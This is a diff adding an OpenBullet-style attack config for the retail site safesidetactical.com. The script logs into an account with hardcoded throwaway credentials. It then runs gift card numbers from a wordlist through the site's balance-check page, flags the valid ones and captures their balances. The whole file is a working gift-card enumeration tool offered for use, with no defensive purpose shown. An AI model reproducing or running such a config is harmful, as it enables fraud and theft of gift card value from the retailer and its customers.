@@ -1,0 +1,47 @@
+[SETTINGS]
+{
+  "Name": "Safesidetactical.com ( Capture )",
+  "SuggestedBots": 10,
+  "LastModified": "2018-07-06T04:26:25.6442792+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "CardPin",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.safesidetactical.com/index.cfm?action=LOGIN" AutoRedirect=TRUE 
+  CONTENT "ReferPage=&goto=myaccount%2Fhome&emailAddress=ggmrggpkf@nospam.today&passwrd=instanthack123&signin=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.safesidetactical.com/login.cfm" 
+  HEADER "origin: https://www.safesidetactical.com" 
+#GET_GIFT_CARD_PAGE REQUEST POST "https://www.safesidetactical.com/myaccount/check-gift-card-balance" AutoRedirect=TRUE 
+  CONTENT "smart_card_num=<USER>&submit.x=67&submit.y=25" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.safesidetactical.com/login.cfm" 
+  HEADER "origin: https://www.safesidetactical.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "We are unable to locate this gift certificate" 
+  KEYCHAIN Success OR 
+    KEY "The balance on this gift card is " 
+#CAPTURE_BALANCE PARSE "<SOURCE>" LR "<p class=\"infoTXT\">The balance on this gift card is <strong>$" "</strong>.</p>" Recursive=FALSE -> CAP "Balance" "$" "" 
